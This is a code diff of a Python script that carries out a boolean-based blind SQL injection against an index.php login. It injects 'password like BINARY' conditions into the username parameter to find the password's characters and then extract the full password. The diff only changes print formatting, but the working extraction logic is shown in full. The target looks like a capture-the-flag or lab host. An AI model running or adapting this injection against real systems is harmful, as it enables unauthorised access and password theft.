@@ -13,7 +13,7 @@ def findPassChars():
         r = requests.get(targetURL+'/index.php?username=hex"+and+password+like+BINARY+"%'+c+'%' )
         if passString in r.text:
            passwordChars+= c 
-           print ('Password contains character :' + c)
+           print ('Password contains character : ' + c)
            
            
            
@@ -24,15 +24,15 @@ def findPassword():
              r =requests.get(targetURL+'/index.php?username=hex"+and+password+like+BINARY+"'+ password + c+'%' )
              if passString in r.text: 
                  password += c                
-                 print ('Current password evaluation:' + password) 
+                 print ('Current password evaluation : ' + password) 
 
            
-print("\n \n \n let's find the Password character\n \n \n ")
+print("\n \n \nlet's find the Password character\n \n \n ")
 findPassChars()
-print("\n character password contents : " + passwordChars)
-print("\n \n \n Now let's find the Password \n \n \n ")
+print("\ncharacter password contents : " + passwordChars)
+print("\n \n \nNow let's find the Password \n \n \n ")
 findPassword()
-print("\n \n \n  Password is : " + password)
+print("\n \n \nPassword is : " + password)
            
 
 
